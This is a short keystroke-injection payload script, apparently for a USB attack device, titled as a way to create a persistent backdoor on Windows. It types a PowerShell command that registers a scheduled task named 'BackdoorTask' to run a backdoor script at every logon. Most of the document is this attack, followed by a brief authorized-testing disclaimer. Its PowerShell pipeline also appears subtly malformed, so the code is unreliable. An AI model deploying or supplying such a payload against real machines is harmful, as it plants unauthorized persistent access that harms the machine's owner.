# Creating a Persistent Backdoor via Scheduled Task

Creates a scheduled task that runs a backdoor script at logon.

```
DELAY 500
GUI r
DELAY 200
STRING powershell -Command "New-ScheduledTaskTrigger -AtLogon | New-ScheduledTaskAction -Execute 'powershell.exe' -Argument 'C:\\path\\to\\backdoor.ps1' | Register-ScheduledTask -TaskName 'BackdoorTask'"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.